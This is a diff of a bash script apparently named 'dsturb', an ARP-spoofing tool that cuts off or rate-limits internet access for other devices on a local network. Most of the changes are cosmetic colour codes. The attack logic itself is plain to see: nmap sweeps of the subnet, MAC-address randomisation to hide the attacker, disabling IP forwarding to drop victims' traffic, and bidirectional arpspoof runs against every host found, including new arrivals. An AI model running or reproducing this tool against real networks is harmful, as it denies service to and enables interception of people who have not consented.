@@ -19,7 +19,7 @@
 #
 
 # Required packages for script to run
-REQUIREMENTS="arpspoof macchanger tc dhclient ifconfig nmap curl"
+REQUIREMENTS="arpspoof macchanger tc dhclient ifconfig nmap curl wget"
 
 # Script version
 VERSION=$(cat /usr/share/dsturb/version)
@@ -87,49 +87,48 @@ readonly CBCyn="\e[5;36m"
 readonly CBGry="\e[5;37m"
 readonly CBWht="\e[5;37m"
 
-printc()
-{
-    local COLS="$(tput cols)"
-    local TEXT=$(echo $1 | wc -c)
-    local SPACES=$((COLS/2-TEXT/2))
-    local I=0
-    while [[ $I -lt $SPACES ]]; do echo -n " "; let I++; done
-    echo -e "$1"
-}
+#printc()
+#{
+#    local COLS="$(tput cols)"
+#    local TEXT=$(echo $1 | wc -c)
+#    local SPACES=$((COLS/2-TEXT/2))
+#    local I=0
+#    while [[ $I -lt $SPACES ]]; do echo -n " "; let I++; done
+#    echo -e "$1"
+#}
 
 printtitle()
 {
     local COLS="$(tput cols)"
-    local FIXED=$(echo "$1" | wc -c)  
+    local FIXED=$(echo -e "$1" | sed 's/\x1b\[[0-9;]*m//g' | wc -c)
     PREFIX=$((COLS/2-FIXED/2-4))
     local I=0
-    while [[ $I -lt $PREFIX ]]; do echo -n "-"; let I++; done
-    [[ ! -z $1 ]] && echo -ne "|   $1   |" || echo -n "--------"
+    while [[ $I -lt $PREFIX ]]; do echo -ne "${CGrn}-${CClr}"; let I++; done
+    [[ ! -z $1 ]] && echo -ne "${CYel}|${CClr}   $1   ${CYel}|${CClr}" || echo -ne "${CGrn}--------${CClr}"
     I=0
     REMAINDER=$((COLS-PREFIX-FIXED-8))
-    while [[ $I -lt $REMAINDER ]]; do echo -n "-"; let I++; done
+    while [[ $I -lt $REMAINDER ]]; do echo -ne "${CGrn}-${CClr}"; let I++; done
     echo
 }
 
-printcf()
-{
-    local COLS="$(tput cols)"
-    local FIXED=100
-    PREFIX=$((COLS/2-FIXED/2))
-    local I=0
-    while [[ $I -lt $PREFIX ]]; do echo -n " "; let I++; done
-    printf "%-${FIXED}b\n" "$1"
-
-}
+#printcf()
+#{
+#    local COLS="$(tput cols)"
+#    local FIXED=100
+#    PREFIX=$((COLS/2-FIXED/2))
+#    local I=0
+#    while [[ $I -lt $PREFIX ]]; do echo -n " "; let I++; done
+#    printf "%-${FIXED}b\n" "$1"
+#}
 
 # Check for updates
 func_check_updates()
 {
-    echo -ne "[*] Checking for updates..."
+    echo -ne "${CGrn}[${CYel}*${CGrn}]${CYel} Checking for updates... ${CClr}"
 
     if ! wget -q --spider https://raw.githubusercontent.com
     then
-        echo -e "cannot check updates!"
+        echo -e "${CRed}cannot check updates!${CClr}"
         return
     fi
 
@@ -137,26 +136,27 @@ func_check_updates()
 
     if [[ $VERSION != $LATEST_VERSION ]]
     then
-        echo -e "update detected! (Version: $LATEST_VERSION)"
+        echo -e "${CGrn}update detected!${CYel} (Version: ${CGrn}$LATEST_VERSION${CYel})${CClr}"
 
         [[ -d /tmp/dsturb_updates ]] && rm -r /tmp/dsturb_updates
 
-        echo -e "[*] Downloading updates..."
+        echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Downloading updates...${CClr}"
         git clone https://github.com/avivbintangaringga/dsturb /tmp/dsturb_updates -q
 
-        echo -e "[*] Installing updates..."
+        echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Installing updates...${CClr}"
         make install -sC /tmp/dsturb_updates
 
-        echo -e "[*] Updates done!"
+        echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Updates done!${CClr}"
         echo -e ""
-        read -p "Do you want to relaunch now? [Y/n]: " RELAUNCH_PROMPT
+        echo -ne "${CYel}Do you want to relaunch now? [${CBGrn}Y${CYel}/${CRed}n${CYel}]: ${CYel}"
+        read RELAUNCH_PROMPT
 
         case $RELAUNCH_PROMPT in
             n|N) exit ;;
-            *) echo -e "\nRelaunching...\n\n" && dsturb && exit ;;
+            *) echo -e "\n${CGrn}[${CYel}*${CGrn}]${CYel} Relaunching...${CClr}\n\n" && dsturb && exit ;;
         esac
     else
-        echo -e "no updates detected!"
+        echo -e "${CYel}no updates detected!${CClr}"
     fi
 }
 
@@ -197,16 +197,16 @@ func_header()
     clear
     printtitle ""
     printtitle ""
-    printtitle "       /##             /##                         /##      "
-    printtitle "      | ##            | ##                        | ##      "
-    printtitle "  /#######  /######$ /######   /##   /##  /###### | ######$ "
-    printtitle " /##__  ## /##_____/|_  ##_/  | ##  | ## /##__  ##| ##__  ##"
-    printtitle "| ##  | ##|  ######   | ##    | ##  | ##| ##  \__/| ##  \ ##"
-    printtitle "| ##  | ## \____  ##  | ## /##| ##  | ##| ##      | ##  | ##"
-    printtitle "|  ####### /#######/  |  ####/|  ######/| ##      | #######/"
-    printtitle " \_______/|_______/    \___/   \______/ |__/      |_______/ "
+    printtitle "       ${CGrn}/${CSYel}##             ${CGrn}/${CSYel}##                         ${CGrn}/${CSYel}##      "
+    printtitle "      ${CGrn}| ${CSYel}##            ${CGrn}| ${CSYel}##                        ${CGrn}| ${CSYel}##      "
+    printtitle "  ${CGrn}/${CSYel}#######  ${CGrn}/${CSYel}######$ ${CGrn}/${CSYel}######   ${CGrn}/${CSYel}##   ${CGrn}/${CSYel}##  ${CGrn}/${CSYel}###### ${CGrn}| ${CSYel}######$ "
+    printtitle " ${CGrn}/${CSYel}##${CGrn}__  ${CSYel}## ${CGrn}/${CSYel}##${CGrn}_____/|_  ${CSYel}##${CGrn}_/  | ${CSYel}##  ${CGrn}| ${CSYel}## ${CGrn}/${CSYel}##${CGrn}__  ${CSYel}##${CGrn}| ${CSYel}##${CGrn}__  ${CSYel}##"
+    printtitle "${CGrn}| ${CSYel}##  ${CGrn}| ${CSYel}##${CGrn}|  ${CSYel}######   ${CGrn}| ${CSYel}##    ${CGrn}| ${CSYel}##  ${CGrn}| ${CSYel}##${CGrn}| ${CSYel}##  ${CGrn}\__/| ${CSYel}##  ${CGrn}\ ${CSYel}##"
+    printtitle "${CGrn}| ${CSYel}##  ${CGrn}| ${CSYel}## ${CGrn}\____  ${CSYel}##  ${CGrn}| ${CSYel}## ${CGrn}/${CSYel}##${CGrn}| ${CSYel}##  ${CGrn}| ${CSYel}##${CGrn}| ${CSYel}##      ${CGrn}| ${CSYel}##  ${CGrn}| ${CSYel}##"
+    printtitle "${CGrn}|  ${CSYel}####### ${CGrn}/${CSYel}#######${CGrn}/  |  ${CSYel}####${CGrn}/|  ${CSYel}######${CGrn}/| ${CSYel}##      ${CGrn}| ${CSYel}#######${CGrn}/"
+    printtitle " ${CGrn}\_______/|_______/    \___/   \______/ |__/      |_______/ ${CClr}"
     printtitle ""
-    printtitle "Author: R7FX, MrSyhd                             version $VERSION"
+    printtitle "${CYel}Author: ${CUBlu}R7FX${CYel}, ${CUBlu}MrSyhd${CClr}                             ${CYel}version${CRed} $VERSION${CClr}"
     printtitle ""
     printtitle ""
     echo
@@ -277,7 +277,7 @@ func_check_prerequires()
         if ! hash $PACKAGE 2>/dev/null
         then
             # Display error message
-            echo -e "ERR: ${RED}$PACKAGE is not installed!$NC\n"
+            echo -e "${CYel}[${CBRed}!${CYel}] ${CRed}$PACKAGE${CYel} is not installed!${CClr}\n"
             # Add package not installed flag
             PACKAGE_NOT_INSTALLED=true
         fi
@@ -290,7 +290,7 @@ func_check_prerequires()
 # Do some cleanup
 func_cleanup()
 {
-    echo -e "\n\n[*] Please wait for the cleanup process to be finished...\n\n"
+    echo -e "\n${CGrn}[${CYel}*${CGrn}]${CYel} Please wait for the cleanup process to be finished...${CClr}\n"
 
     # Get all child process PIDs (arpspoof)
     local PIDS=$(jobs -pr)
@@ -308,7 +308,7 @@ func_cleanup()
     [[ ! -z $RANDOMIZE_MAC ]] && if $RANDOMIZE_MAC
     then
 
-        echo -e "\n\n[*] Restoring to original MAC Address....\n\n"
+        echo -e "\n${CGrn}[${CYel}*${CGrn}]${CYel} Restoring to original MAC Address....${CClr}\n"
 
         # Turn interface down
         ifconfig $INTERFACE down > /dev/null 2>&1
@@ -323,6 +323,8 @@ func_cleanup()
         dhclient $INTERFACE > /dev/null 2>&1 
     fi
 
+    tput cnorm
+
     # Restore terminal screen
     tput rmcup
 
@@ -335,7 +337,7 @@ func_randomize_mac()
 {
     func_header
 
-    echo -e "[*] Randomizing MAC Address of interface \"$INTERFACE\""
+    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Randomizing MAC Address of interface \"${CGrn}$INTERFACE${CYel}\"${CClr}"
 
     # Turn interface down
     ifconfig $INTERFACE down > /dev/null 2>&1
@@ -349,8 +351,8 @@ func_randomize_mac()
     # Get new MAC Address
     read NEW_MAC </sys/class/net/$INTERFACE/address
 
-    echo -e "[*] New MAC Address: $NEW_MAC"
-    echo -e "[*] Waiting until connected to a network..."
+    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} New MAC Address: ${CGrn}$NEW_MAC${CClr}"
+    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Waiting until connected to a network...${CClr}"
 
     # Request new IP Address to DHCP Server
     dhclient $INTERFACE > /dev/null 2>&1
@@ -384,9 +386,9 @@ func_scan_network()
     func_header
 	
 	# Print host length warning
-	[[ $CIDR -lt 22 ]] && echo -e "[!] Large network detected, this scan may take minutes or hours"
+	[[ $CIDR -lt 22 ]] && echo -e "${CGrn}[${CBRed}!${CGrn}]${CGrn} Large network detected, this scan may take minutes or hours${CClr}"
 
-    echo -e "[*] Scanning network $NETWORK..."
+    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Scanning network ${CGrn}$NETWORK${CYel}...${CClr}"
 
     # Scan all available IP Address in then network
     SCAN_RESULT=$(nmap -sn $NETWORK | grep "for" | cut -d ' ' -f 5-)
@@ -415,7 +417,7 @@ func_scan_network()
     # No IP address on the network, prompting to rescan
     if [[ -z $SCAN_RESULT ]]
     then
-        echo -e "[!] No IP Address is detected on the network! Rescanning in 3 seconds... "
+        echo -e "${CGrn}[${CBRed}!${CGrn}]${CYel} No IP Address is detected on the network! Rescanning in 3 seconds... ${CClr}"
         sleep 3
         func_scan_network
     fi
@@ -424,39 +426,40 @@ func_scan_network()
 # Start the attack :)
 func_start_attack()
 {
+    tput civis
+
     func_header
 
     # No rate limit specified
     [[ -z $RATE_LIMIT ]] && RATE_LIMIT="Unlimited"
 
-    echo -e " +"
-    echo -e " | Target Network      : $NETWORK"
-    echo -ne " | Bandwidth Limit     : "
-    [[ $FORWARD_TRAFFIC == true ]] && echo -e "$RATE_LIMIT" || echo -e "Internet access blocked!"
-    echo -e " | Excluded IP Address : $EXCLUDED_IP"
-    echo -e " +"
+    echo -e " ${CYel}+${CCLr}"
+    echo -e " ${CGrn}|${CYel} Target Network      ${CGrn}: ${CYel}$NETWORK${CClr}"
+    echo -ne " ${CGrn}|${CYel} Bandwidth Limit     ${CGrn}: ${CYel}"
+    [[ $FORWARD_TRAFFIC == true ]] && echo -e "$RATE_LIMIT${CClr}" || echo -e "${CBRed}Internet access blocked!${CClr}"
+    echo -e " ${CGrn}|${CYel} Excluded IP Address ${CGrn}: ${CYel}$EXCLUDED_IP${CClr}"
+    echo -e " ${CYel}+${CClr}"
     echo -e ""
 
     # Block or forward internet access
     if [[ $FORWARD_TRAFFIC == true ]]
     then
-        echo -e "[*] Forwarding internet access..."
+        echo -e "${CGrn}[${CYel}*${CGrn}] ${CGrn}Forwarding${CYel} internet access...${CClr}"
         # Enabling IP Forwarding
         sysctl -q net.ipv4.ip_forward=1
     else
-        echo -e "[*] Dropping internet access..."
+        echo -e "${CGrn}[${CYel}*${CGrn}] ${CRed}Dropping${CYel} internet access..${CClr}."
         # Disabling IP Forwarding
         sysctl -q net.ipv4.ip_forward=0
     fi
 
     # Start the ARP Spoofing and print the output
-    echo -e "[*] Log:\n"
+    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Log:${CClr}\n"
 
     for IP in $TARGET_IP
     do
-        echo -e "[$(date '+%T')] Spoofing target: $IP"
-        arpspoof -t $IP $GATEWAY > /dev/null 2>&1 &
-        arpspoof -t $GATEWAY $IP > /dev/null 2>&1 &
+        echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}]${CYel} Spoofing target: ${CGrn}$IP${CClr}"
+        arpspoof -rt $IP $GATEWAY > /dev/null 2>&1 &
     done
 
     # Loop and discover new targets
@@ -472,9 +475,8 @@ func_start_attack()
 
             if ! echo $TARGET_IP | grep -qw "$IP"
             then
-                echo -e "[$(date '+%T')] Discovered new target: $IP"
-                arpspoof -t $IP $GATEWAY > /dev/null 2>&1 &
-                arpspoof -t $GATEWAY $IP > /dev/null 2>&1 &
+                echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}]${CYel} Discovered new target: ${CGrn}$IP${CClr}"
+                arpspoof -rt $IP $GATEWAY > /dev/null 2>&1 &
                 [[ $FORWARD_TRAFFIC == true && $RATE_LIMIT != "Unlimited" ]] && func_add_rate_limit_target $IP
                 TARGET_IP="$TARGET_IP $IP"
             fi
@@ -492,14 +494,14 @@ start_interactive_mode()
 
     # Print header
     func_header
-    echo -e "Select Network Interface:\n"
+    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Select Network Interface:${CClr}\n"
 
     # Iterate all interface that connected to a network
     local INDEX=1
     while read -r IFACE
     do
         # Print it
-        printf " %2s)  %-16s %s\n" $INDEX $IFACE
+        printf " ${CGrn}%2s${CYel})  %-16s %s\n" $INDEX $IFACE
 
         # Assign the interface to an array
         IFACE_LIST[$INDEX]=$IFACE
@@ -509,7 +511,8 @@ start_interactive_mode()
     # If no interface is connected to a network, then prompt to rescan
     if [[ -z ${IFACE_LIST[@]} ]]
     then
-        read -n1 -p "[!] No interface is currently connected to any network! Scan again? [Y/n]: " SCAN_AGAIN
+        echo -ne "${CGrn}[${CBRed}!${CGrn}]${CYel} No interface is currently connected to any network! Scan again? [${CBGrn}Y${CYel}/${CRed}n${CYel}]: ${CYel}"
+        read -n1 SCAN_AGAIN
 
         case $SCAN_AGAIN in
             N|n) func_cleanup ;;
@@ -523,8 +526,8 @@ start_interactive_mode()
         # When interface list is only 1, it will be selected as default so you don't have to choose
         [[ ${#IFACE_LIST[@]} == 1 ]] && SELECTED_IFACE=${IFACE_LIST[1]} && break
 
-        echo -e ""
-        read -p "[Select]: " SELECT
+        echo -ne "\n${CGrn}[${CYel}Select${CGrn}]${CYel}: "
+        read SELECT
 
         SELECTED_IFACE=${IFACE_LIST[$SELECT]}
     done
@@ -537,7 +540,8 @@ start_interactive_mode()
 
     # Prompt MAC Address randomization
     func_header
-    read -n1 -p "[?] Do you want to randomize $INTERFACE MAC Address? [y/N]: " RANDOMIZE_MAC_PROMPT
+    echo -ne "${CGrn}[${CYel}?${CGrn}]${CYel} Do you want to randomize ${CGrn}$INTERFACE${CYel} MAC Address? [${CGrn}y${CYel}/${CBRed}N${CYel}]: ${CYel}"
+    read -n1 RANDOMIZE_MAC_PROMPT
 
     if [[ "$RANDOMIZE_MAC_PROMPT" == "y" || "$RANDOMIZE_MAC_PROMPT" == "Y" ]]
     then
@@ -567,28 +571,28 @@ start_interactive_mode()
     # Print header
     func_header
 
-    echo -e " +"
-    echo -e " | Gateway     : $GATEWAY"
-    echo -e " | Excluded IP : $EXCLUDED_IP"
-    echo -e " +"
+    echo -e " ${CYel}+${CClr}"
+    echo -e " ${CGrn}|${CYel} Gateway     ${CGrn}: ${CYel}$GATEWAY${CClr}"
+    echo -e " ${CGrn}|${CYel} Excluded IP ${CGrn}: ${CYel}$EXCLUDED_IP${CClr}"
+    echo -e " ${CYel}+${CClr}"
     echo -e ""
-    echo -e "Select Target:\n"
+    echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Select Target:\n"
 
     # Iterate all hosts found
     INDEX=1
     while [[ $INDEX -le ${#HOSTS[@]} ]]
     do
         # Print it
-        printf " %3s)  %s\n" $INDEX "${HOSTS[$INDEX]}"
+        printf " ${CGrn}%3s${CYel})  %s\n" $INDEX "${HOSTS[$INDEX]}"
 
         # Assign the IP to an array
         IP_LIST[$INDEX]=$(echo "${HOSTS[$INDEX]}" | cut -d ' ' -f1)
         let 'INDEX++'
     done
 
-    echo -e "   *)  All Addresses"
-    echo -e ""
-    read -p "[Select]: " SELECT_IP
+    echo -e "   ${CGrn}*${CYel})  All Addresses"
+    echo -ne "${CGrn}[${CYel}Select${CGrn}]${CYel}: "
+    read SELECT_IP
 
     # If all address is selected
     if [[ ($SELECT_IP == "*" || -z $SELECT_IP) ]]
@@ -602,27 +606,28 @@ start_interactive_mode()
             func_header
 
             # Prompt to exclude IP
-            read -n1 -p "[?] Do you want to exclude IP Address? [y/N]: " EXCLUDE_PROMPT
+            echo -ne "${CGrn}[${CYel}?${CGrn}]${CYel} Do you want to exclude IP Address? [${CGrn}y${CYel}/${CBRed}N${CYel}]: ${CYel}"
+            read -n1 EXCLUDE_PROMPT
             if [[ $EXCLUDE_PROMPT == "y" || $EXCLUDE_PROMPT == "Y" ]]
             then
                 func_header
 
-                echo -e " +"
-                echo -e " | Gateway     : $GATEWAY"
-                echo -e " | Excluded IP : $EXCLUDED_IP"
-                echo -e " +"
+                echo -e " ${CYel}+${CClr}"
+                echo -e " ${CGrn}|${CYel} Gateway     ${CGrn}: ${CYel}$GATEWAY${CClr}"
+                echo -e " ${CGrn}|${CYel} Excluded IP ${CGrn}: ${CYel}$EXCLUDED_IP${CClr}"
+                echo -e " ${CYel}+${CClr}"
                 echo -e ""
-                echo -e "Select IP Addresses you want to exclude:\n"
+                echo -e "${CGrn}[${CYel}*${CGrn}]${CYel} Select IP Addresses you want to exclude:\n"
 
                 local INDEX2=1
                 while [[ $INDEX2 -le ${#HOSTS[@]} ]]
                 do
-                    printf " %3s)  %s\n" $INDEX2 "${HOSTS[$INDEX2]}"
+                    printf " ${CGrn}%3s${CYel})  %s\n" $INDEX2 "${HOSTS[$INDEX2]}"
                     let 'INDEX2++'
                 done
 
-                echo -e ""
-                read -p "[Select]: " SELECT_EXCLUDE_IP
+                echo -ne "${CGrn}[${CYel}Select${CGrn}]${CYel}: "
+                read SELECT_EXCLUDE_IP
 
                 # Remove excluded IP from target list
                 for SELECTED in $(echo $SELECT_EXCLUDE_IP | tr ',' ' ')
@@ -645,7 +650,8 @@ start_interactive_mode()
     func_header
 
     # Prompt to forward internet access
-    read -n1 -p "[?] Forward internet access from client? [Y/n]: " FORWARD_PROMPT
+    echo -ne "${CGrn}[${CYel}?${CGrn}]${CYel} Forward internet access from client? [${CBGrn}Y${CYel}/${CRed}n${CYel}]: ${CYel}"
+    read -n1 FORWARD_PROMPT
 
     case $FORWARD_PROMPT in
         n|N) FORWARD_TRAFFIC=false ;;
@@ -656,17 +662,19 @@ start_interactive_mode()
     if $FORWARD_TRAFFIC
     then
         func_header
-        echo -e "Enter bandwidth rate limit for targets:"
+        echo -e "${CYel}Enter bandwidth rate limit for targets:"
         echo -e "   Supported Units: b, k, m, g, t, B, K, M, G, T  (default: b)"
         echo -e "   Leave empty to make unlimited rate"
-        echo -e "   (e.g.: 500K)\n" 
-        read -p "[Limit]: " RATE_LIMIT
+        echo -e "   (e.g.: 500K)\n${CClr}"
+        echo -ne "${CGrn}[${CYel}Limit${CGrn}]${CYel}: "
+        read RATE_LIMIT
 
         # Loop until correct format is inputted, and then start the limitting
         [[ ! -z $RATE_LIMIT ]] && while ! func_check_rate_limit
         do
-            echo -e "\n[!] Invalid input!\n"
-            read -p "[Limit]: " RATE_LIMIT
+            echo -e "\n${CGrn}[${CBRed}!${CGrn}]${CRed} Invalid input!${CClr}\n"
+            echo -ne "${CGrn}[${CYel}Limit${CGrn}]${CYel}: "
+            read RATE_LIMIT
         done && func_rate_limit
     fi
 
@@ -691,7 +699,11 @@ func_check_prerequires
 #    exit 1
 #fi
 
+echo -e "\n${CSGrn}dsturb${CYel} version ${CRed}$VERSION${CClr}\n"
+
 func_check_updates
+
+echo -e ""
 
 # If no argument is given, then run interactive mode
 [[ -z $1 ]] && start_interactive_mode
@@ -720,23 +732,23 @@ done
 [[ -z $RANDOMIZE_MAC ]] && RANDOMIZE_MAC=false
 
 # Check for interface availability
-[[ ! -d /sys/class/net/$INTERFACE ]] && echo -e "\n[!] Interface \"$INTERFACE\" doesn't exist!\n" && exit 1
+[[ ! -d /sys/class/net/$INTERFACE ]] && echo -e "\n${CGrn}[${CBRed}!${CGrn}]${CYel} Interface \"${CRed}$INTERFACE${CYel}\" doesn't exist!${CClr}\n" && exit 1
 
 # Check rate limit format
 [[ ! -z $RATE_LIMIT ]] && if ! func_check_rate_limit
 then
-    echo -e "\n[!] Invalid rate limit!\n"
+    echo -e "\n${CGrn}[${CBRed}!${CGrn}]${CYel}Invalid rate limit!${CClr}\n"
     func_help
     exit 1
 fi
 
 # Loop through all IP Addresses to validate IP Address format
-[[ ! -z $EXCLUDED_IP ]] && for IP in "$EXCLUDED_IP"
+[[ ! -z $EXCLUDED_IP ]] && EXCLUDED_IP=$(echo "$EXCLUDED_IP" | tr ',' ' ') && for IP in "$EXCLUDED_IP"
 do
     # Call the function to validate IP Address
     if ! func_check_ip $IP
     then
-        echo -e "[!] Invalid IP Address: $IP"
+        echo -e "${CGrn}[${CBRed}!${CGrn}]${CYel} Invalid IP Address: ${CRed}$IP${CClr}"
         # Flag invalid IP Address
         INVALID_IP=true
     fi
@@ -751,7 +763,7 @@ EXCLUDED_IP=$(echo "$MY_IP $EXCLUDED_IP" | tr ',' ' ' | tr -s ' ')
 
 # Get network address from interface
 NETWORK=$(ip -o -f inet addr show $INTERFACE 2>&1 | awk '/scope global/ {printf "%s\n",$4}')
-[[ -z $NETWORK ]] && echo -e "\n[!] Interface \"$INTERFACE\" doesn't connected to any network!\n" && exit 1
+[[ -z $NETWORK ]] && echo -e "\n${CGrn}[${CBRed}!${CGrn}]${CYel} Interface \"${CRed}$INTERFACE${CYel}\" doesn't connected to any network!${CClr}\n" && exit 1
 
 # Get Gateway IP Address
 GATEWAY=$(route -n | grep -w $INTERFACE | awk '{print $2}' | grep -v "0.0.0.0")
